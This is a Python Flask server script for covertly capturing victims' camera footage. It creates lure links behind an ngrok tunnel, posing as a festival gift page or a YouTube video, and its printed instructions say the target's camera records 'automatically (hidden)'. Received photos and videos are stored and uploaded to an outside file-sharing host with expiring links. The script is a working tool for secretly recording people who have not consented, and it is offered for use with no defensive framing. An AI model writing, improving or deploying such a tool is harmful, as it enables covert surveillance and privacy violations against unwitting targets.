#!/usr/bin/env python3
"""
Gift Video Receiver Server - With transfa Cloud Upload (Fixed)
"""

import os
import sys
import time
import json
import subprocess
import threading
import urllib.parse
import urllib.request
import re
from datetime import datetime
from pathlib import Path
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS

# ============================================
# Try to import transfa
# ============================================
TRANSFA_AVAILABLE = False
TRANSFA_UPLOAD_FUNC = None

try:
    import transfa
    TRANSFA_AVAILABLE = True
    print("✅ transfa library loaded successfully")
    
    # Check which upload function exists
    if hasattr(transfa, 'upload'):
        TRANSFA_UPLOAD_FUNC = transfa.upload
        print("   ✅ Using transfa.upload()")
    elif hasattr(transfa, 'upload_file'):
        TRANSFA_UPLOAD_FUNC = transfa.upload_file
        print("   ✅ Using transfa.upload_file()")
    elif hasattr(transfa, 'send'):
        TRANSFA_UPLOAD_FUNC = transfa.send
        print("   ✅ Using transfa.send()")
    else:
        print("   ⚠️ No upload function found in transfa module")
        print(f"   📋 Available attributes: {dir(transfa)}")
        TRANSFA_AVAILABLE = False
        
except ImportError:
    TRANSFA_AVAILABLE = False
    print("⚠️ transfa library not installed. Run: pip install transfa")
except Exception as e:
    TRANSFA_AVAILABLE = False
    print(f"⚠️ Error loading transfa: {e}")

# ============================================
# Alternative: Use requests if transfa doesn't work
# ============================================
def upload_to_transfa_requests(filepath, ttl="24h"):
    """Upload to transfa using requests (fallback method)"""
    try:
        import requests
        
        # transfa API endpoint (based on their documentation)
        # If this doesn't work, you might need to check transfa's actual API
        url = "https://transfa.com/api/upload"
        
        with open(filepath, 'rb') as f:
            files = {'file': (os.path.basename(filepath), f)}
            data = {'ttl': ttl}
            
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                result = response.json()
                return type('UploadResult', (), {
                    'url': result.get('url'),
                    'delete_token': result.get('delete_token'),
                    'success': True
                })()
            else:
                return None
    except Exception as e:
        print(f"   ❌ requests fallback error: {e}")
        return None

# ============================================
# Configuration
# ============================================
UPLOAD_FOLDER = 'gift_videos'
PORT = 5000
FESTIVAL_HTML = 'festival.html'
YOUTUBE_HTML = 'youtube.html'

# transfa configuration
TRANSFA_TTL = "24h"
TRANSFA_MAX_DOWNLOADS = None

# ============================================
# Flask Application
# ============================================
app = Flask(__name__)
CORS(app)

received_files = []
transfa_links = []

@app.route('/festival')
def festival_page():
    try:
        with open(FESTIVAL_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404

@app.route('/youtube')
def youtube_page():
    try:
        with open(YOUTUBE_HTML, 'r') as f:
            return f.read()
    except FileNotFoundError:
        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404

@app.route('/upload', methods=['POST'])
def upload_media():
    try:
        if 'media' not in request.files:
            return jsonify({'error': 'No media file'}), 400
        
        media_file = request.files['media']
        if media_file.filename == '':
            return jsonify({'error': 'No filename'}), 400

        media_type = request.form.get('type', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if media_type == 'photo':
            ext = 'jpg'
        else:
            ext = 'webm'
        
        filename = f"{media_type}_{timestamp}.{ext}"
        filepath = os.path.join(UPLOAD_FOLDER, filename)

        # Save file locally first
        media_file.save(filepath)
        
        file_info = {
            'filename': filename,
            'path': filepath,
            'type': media_type,
            'timestamp': timestamp,
            'size': os.path.getsize(filepath),
            'transfa_link': None,
            'transfa_delete_token': None,
            'upload_method': None
        }
        
        # ============================================
        # Upload to transfa
        # ============================================
        if TRANSFA_AVAILABLE and TRANSFA_UPLOAD_FUNC:
            try:
                print(f"\n☁️ Uploading {filename} to transfa...")
                
                # Try different upload methods
                result = None
                
                # Method 1: Using the discovered upload function
                try:
                    if TRANSFA_UPLOAD_FUNC:
                        result = TRANSFA_UPLOAD_FUNC(filepath, ttl=TRANSFA_TTL)
                        file_info['upload_method'] = 'transfa native'
                except TypeError:
                    # Try without ttl parameter
                    try:
                        result = TRANSFA_UPLOAD_FUNC(filepath)
                        file_info['upload_method'] = 'transfa native (no ttl)'
                    except Exception as e:
                        print(f"   ⚠️ Native upload failed: {e}")
                        result = None
                
                # Method 2: If native failed, try requests fallback
                if not result or not hasattr(result, 'url'):
                    print("   🔄 Trying requests fallback...")
                    result = upload_to_transfa_requests(filepath, TRANSFA_TTL)
                    file_info['upload_method'] = 'requests fallback'
                
                if result and hasattr(result, 'url'):
                    file_info['transfa_link'] = result.url
                    file_info['transfa_delete_token'] = getattr(result, 'delete_token', None)
                    
                    print(f"   ✅ Uploaded to transfa!")
                    print(f"   🔗 Link: {result.url}")
                    print(f"   📋 Method: {file_info['upload_method']}")
                    if hasattr(result, 'delete_token'):
                        print(f"   🗑️ Delete token: {result.delete_token}")
                    
                    transfa_links.append({
                        'filename': filename,
                        'url': result.url,
                        'delete_token': getattr(result, 'delete_token', None),
                        'expires': TRANSFA_TTL,
                        'upload_method': file_info['upload_method']
                    })
                else:
                    print(f"   ⚠️ Upload failed - no URL returned")
                    
            except Exception as e:
                print(f"   ❌ transfa upload error: {e}")
                print(f"   📋 Available functions in transfa: {dir(transfa) if TRANSFA_AVAILABLE else 'N/A'}")
        else:
            print(f"   ⚠️ transfa not available. File saved locally only.")
            if TRANSFA_AVAILABLE:
                print(f"   📋 transfa attributes: {dir(transfa)}")
        
        received_files.append(file_info)
        
        # Display received info
        print(f"\n📹 Received {media_type} {len(received_files)}")
        print(f"   📁 {filename}")
        print(f"   📊 {file_info['size']:,} bytes")
        print(f"   📂 Full path: {os.path.abspath(filepath)}")
        
        if file_info.get('transfa_link'):
            print(f"   ☁️ transfa link: {file_info['transfa_link']}")
            print(f"   🔧 Upload method: {file_info.get('upload_method', 'unknown')}")
        else:
            print(f"   ⚠️ Not uploaded to transfa")
        
        return jsonify({
            'success': True, 
            'filename': filename,
            'transfa_link': file_info.get('transfa_link'),
            'local_path': os.path.abspath(filepath),
            'upload_method': file_info.get('upload_method')
        }), 200

    except Exception as e:
        print(f"❌ Error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/files', methods=['GET'])
def list_files():
    return jsonify({
        'files': received_files,
        'transfa_links': transfa_links
    })

@app.route('/transfa-links', methods=['GET'])
def get_transfa_links():
    """Get all transfa links"""
    return jsonify({
        'links': transfa_links,
        'total': len(transfa_links)
    })

@app.route('/download/<filename>', methods=['GET'])
def download_file(filename):
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

# ============================================
# Main Server Class
# ============================================
class GiftServer:
    def __init__(self):
        self.ngrok_process = None
        self.ngrok_url = None
        self.port = PORT
        self.running = True
        self.ngrok_ready = threading.Event()

    def setup_directories(self):
        Path(UPLOAD_FOLDER).mkdir(exist_ok=True)

    def check_html_files(self):
        if not os.path.exists(FESTIVAL_HTML):
            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
            return False
        if not os.path.exists(YOUTUBE_HTML):
            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
            return False
        return True

    def check_transfa(self):
        """Check if transfa is working"""
        if not TRANSFA_AVAILABLE:
            print("\n⚠️ transfa library not available!")
            print("📥 Install with: pip install transfa")
            print("   Or try: pip install transfa-client")
            return False
        return True

    def get_camera_type(self):
        print("\n📷 Select camera type:")
        print("  1. Front Camera")
        print("  2. Back Camera")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'user'
            elif choice == '2':
                return 'environment'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_capture_mode(self):
        print("\n📸 Select capture mode:")
        print("  1. Video - Record 15 second video")
        print("  2. Photo - Capture 5 photos")
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'video', 15, 0
            elif choice == '2':
                return 'photo', 0, 5
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def show_main_menu(self):
        print("\n" + "="*60)
        print("🎁 GIFT VIDEO RECEIVER")
        print("="*60)
        print("\nSelect mode:")
        print("  1. 🎊 Festival Mode - Gift/surprise page with festival name")
        print("  2. 🎬 YouTube Mode - YouTube video with hidden camera")
        print("\n" + "-"*60)
        
        while True:
            choice = input("\nEnter choice (1 or 2): ").strip()
            if choice == '1':
                return 'festival'
            elif choice == '2':
                return 'youtube'
            else:
                print("❌ Invalid choice. Enter 1 or 2")

    def get_festival_name(self):
        name = input("\n📝 Enter festival/gift name: ").strip()
        if not name:
            name = "Surprise"
            print(f"   Using default: {name}")
        return name

    def get_youtube_video(self):
        print("\n🎬 Enter YouTube video URL or ID:")
        print("   (Press Enter for default video)")
        video = input("   ▶ ").strip()
        
        if video and ('youtube.com' in video or 'youtu.be' in video):
            patterns = [
                r'(?:youtube\.com\/watch\?v=)([^&]+)',
                r'(?:youtu\.be\/)([^?]+)',
                r'(?:youtube\.com\/embed\/)([^?]+)'
            ]
            for pattern in patterns:
                match = re.search(pattern, video)
                if match:
                    video = match.group(1)
                    break
        
        if not video:
            video = "dQw4w9WgXcQ"
            print(f"   Using default video ID: {video}")
        else:
            print(f"   Using video ID: {video}")
        
        return video

    def get_transfa_config(self):
        """Get transfa configuration from user"""
        print("\n☁️ transfa Cloud Upload Configuration:")
        print("   Files will be uploaded to transfa with auto-expiry")
        print("")
        print("   Select expiry time:")
        print("     1. 1 hour")
        print("     2. 24 hours (default)")
        print("     3. 7 days")
        print("     4. 30 days")
        
        while True:
            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
            if choice == '' or choice == '2':
                return "24h"
            elif choice == '1':
                return "1h"
            elif choice == '3':
                return "7d"
            elif choice == '4':
                return "30d"
            else:
                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")

    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
        base_url = self.ngrok_url
        
        if mode == 'festival':
            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎊 Festival Mode"
        else:
            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
            mode_name = "🎬 YouTube Mode"
        
        return link, mode_name

    def check_ngrok(self):
        try:
            result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except FileNotFoundError:
            pass
        
        print("\n❌ ngrok is not installed or not in PATH!")
        print("📥 Install from: https://ngrok.com/download")
        return False

    def monitor_ngrok(self):
        try:
            time.sleep(3)
            for attempt in range(10):
                try:
                    with urllib.request.urlopen('http://localhost:4040/api/tunnels', timeout=2) as response:
                        data = json.loads(response.read().decode())
                        for tunnel in data.get('tunnels', []):
                            if tunnel.get('proto') == 'https':
                                self.ngrok_url = tunnel.get('public_url')
                                self.ngrok_ready.set()
                                return
                except Exception:
                    time.sleep(3)
        except Exception as e:
            print(f"❌ Error monitoring ngrok: {e}")

    def start_ngrok(self):
        print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
        
        try:
            self.ngrok_process = subprocess.Popen(
                ['ngrok', 'http', str(self.port)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
            
            monitor_thread = threading.Thread(target=self.monitor_ngrok)
            monitor_thread.daemon = True
            monitor_thread.start()
            
            if self.ngrok_ready.wait(timeout=30):
                print(f"✅ Tunnel established!")
                return True
            else:
                print("⚠️ ngrok started but URL not found")
                return False
                
        except Exception as e:
            print(f"❌ Failed to start ngrok: {e}")
            return False

    def start_flask(self):
        print(f"\n🔧 Starting server on port {self.port}...")
        
        def run_flask():
            app.run(host='0.0.0.0', port=self.port, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask)
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)
        print("✅ Server running")

    def wait_for_files(self):
        print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
        print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
        if TRANSFA_AVAILABLE:
            print("☁️ Files will be uploaded to transfa cloud")
        else:
            print("⚠️ transfa not available - files saved locally only")
        print("-"*50)
        print("\n⏳ Waiting for first file...")
        print("💡 Files will NOT auto-open. Check the folder or transfa links.")
        
        try:
            last_count = 0
            while self.running:
                current_count = len(received_files)
                
                if current_count > last_count:
                    file_info = received_files[-1]
                    print(f"\n📹 Received {file_info['type']} {current_count}")
                    print(f"   📁 {file_info['filename']}")
                    print(f"   📊 {file_info['size']:,} bytes")
                    print(f"   📂 Full path: {os.path.abspath(file_info['path'])}")
                    
                    if file_info.get('transfa_link'):
                        print(f"   ☁️ transfa link: {file_info['transfa_link']}")
                        print(f"   🔧 Upload method: {file_info.get('upload_method', 'unknown')}")
                        print(f"   ⏰ Expires in: {TRANSFA_TTL}")
                    else:
                        print(f"   ⚠️ Not uploaded to transfa")
                        if TRANSFA_AVAILABLE:
                            print(f"   📋 Check transfa installation or API")
                    
                    print("\n   💡 To download from transfa, use the link above")
                    print(f"   📁 Or open locally: cd {os.path.abspath(UPLOAD_FOLDER)}")
                    last_count = current_count
                    print(f"\n⏳ Waiting for next file...")
                
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n\n👋 Shutting down...")

    def cleanup(self):
        print("\n🧹 Cleaning up...")
        if self.ngrok_process:
            self.ngrok_process.terminate()
            try:
                self.ngrok_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.ngrok_process.kill()
        print("✅ Done!")

    def run(self):
        try:
            self.setup_directories()
            
            if not self.check_html_files():
                return
            
            if not self.check_ngrok():
                return
            
            # Check transfa
            self.check_transfa()
            
            # Get transfa config if available
            if TRANSFA_AVAILABLE:
                global TRANSFA_TTL
                TRANSFA_TTL = self.get_transfa_config()
                print(f"   ✅ Files will expire after: {TRANSFA_TTL}")
            else:
                print("\n⚠️ Continuing without transfa (files saved locally only)")
                print("   To enable transfa, install: pip install transfa requests")
            
            mode = self.show_main_menu()
            
            camera = self.get_camera_type()
            
            capture_mode, duration, photos = self.get_capture_mode()
            
            if mode == 'festival':
                name = self.get_festival_name()
                video_id = None
            else:
                video_id = self.get_youtube_video()
                name = None
            
            self.start_flask()
            if not self.start_ngrok():
                return
            
            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
            
            print("\n" + "="*60)
            print(f"📤 SHARE THIS LINK ({mode_name}):")
            print("="*60)
            print(f"\n🔗 {link}")
            print("\n" + "="*60)
            
            print("\n📋 Configuration Summary:")
            print(f"   🎯 Mode: {mode_name}")
            print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
            print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
            if TRANSFA_AVAILABLE:
                print(f"   ☁️ transfa expiry: {TRANSFA_TTL}")
            else:
                print(f"   ☁️ transfa: DISABLED (files saved locally only)")
            
            if mode == 'festival':
                print(f"   🎊 Festival Name: {name}")
            else:
                print(f"   🎬 Video ID: {video_id}")
            
            print("\n📋 Instructions:")
            if mode == 'festival':
                print("   1. Send the link above to anyone")
                print("   2. They see a festival/gift page")
                print("   3. They click 'Open Your Gift'")
                print("   4. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   5. Records {duration} second video")
                else:
                    print(f"   5. Captures {photos} photos")
                if TRANSFA_AVAILABLE:
                    print("   6. Files upload to transfa cloud!")
                else:
                    print("   6. Files saved locally only")
            else:
                print("   1. Send the link above to anyone")
                print("   2. They see a YouTube video playing")
                print("   3. Camera records automatically (hidden)")
                if capture_mode == 'video':
                    print(f"   4. Records {duration} second video")
                else:
                    print(f"   4. Captures {photos} photos")
                if TRANSFA_AVAILABLE:
                    print("   5. Files upload to transfa cloud!")
                else:
                    print("   5. Files saved locally only")
            
            if TRANSFA_AVAILABLE:
                print(f"\n☁️ transfa: Files expire after {TRANSFA_TTL}")
                print("   Links will be shown when files are received")
            
            print("\n💡 Files saved locally too. Check the folder:")
            print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
            print("="*60)
            print("\n📋 Link printed above - copy it manually")
            print(f"📁 Files saved in: {os.path.abspath(UPLOAD_FOLDER)}/")
            
            self.wait_for_files()
            
        except KeyboardInterrupt:
            print("\n\n👋 Goodbye!")
        finally:
            self.cleanup()

if __name__ == '__main__':
    server = GiftServer()
    server.run()